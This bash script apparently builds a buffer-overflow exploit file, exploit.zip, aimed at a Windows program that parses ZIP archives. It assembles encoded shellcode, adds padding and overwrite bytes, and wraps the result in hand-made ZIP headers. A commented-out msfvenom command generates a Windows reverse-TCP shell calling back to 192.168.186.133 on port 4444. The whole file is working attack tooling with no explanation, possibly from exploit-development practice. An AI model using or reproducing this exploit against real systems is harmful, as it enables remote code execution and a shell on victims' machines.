#!/bin/bash

SRC="./shellcode-unencoded"
BASE="$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w8 | head -n1)"
N_CHUNKS=10
CHUNK_SIZE=90

#   [ ! -f ${SRC} ] && msfvenom \
#                           -p windows/shell_reverse_tcp \
#                               exitfunc=none \
#                               lhost=192.168.186.133 \
#                               lport=4444 \
#                           -e x86/fnstenv_mov \
#                           -o shellcode-unencoded \
#                           -b '\x00'

SHELL=$(xxd -p ${SRC} | tr -d '\n' | sed -r "s/(..)/\\\x\1/g")

echo "Writing to ${BASE}.nasm"
#./xor.py "$(echo -ne "${SHELL}")" >> ${BASE}.nasm
cp working.nasm ${BASE}.nasm
nasm ${BASE}.nasm -o ${BASE}
BUFFER=$(cat ${BASE})

echo "buf  = \"\"" > src.txt
echo "${BUFFER}" | xxd -p | tr -d '\n' | sed -r 's/(..)/\\\x\1/g' | fold -w48 | sed -r 's/^(.*)$/buf += "\1"/g' >> src.txt

BUFFER="${BUFFER}$(python -c "print('A' * 3)")"
BUFFER="${BUFFER}\x82\x03\x81\x98\x98\x41\x41\x41"
BUFFER="${BUFFER}\x89\x94\x77\x03\x41\x00"  
BUFFER="${BUFFER}$(python -c "print('{0}.txt'.format('\x46' * 3030))" | tr -d '\n')"
cat <(echo -en "${BUFFER}") | wc -c

LDF="\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x0f\x00\x00"
CDF="\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00\x00\x00\x00\x00\x00"
EOF="\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00"

python -c "from __future__ import print_function; print('${LDF}${BUFFER}${CDF}${BUFFER}${EOF}', end='')" > payload_${BASE}
rm ./exploit.zip
ln -s ./payload_${BASE} ./exploit.zip

rm ${BASE}*
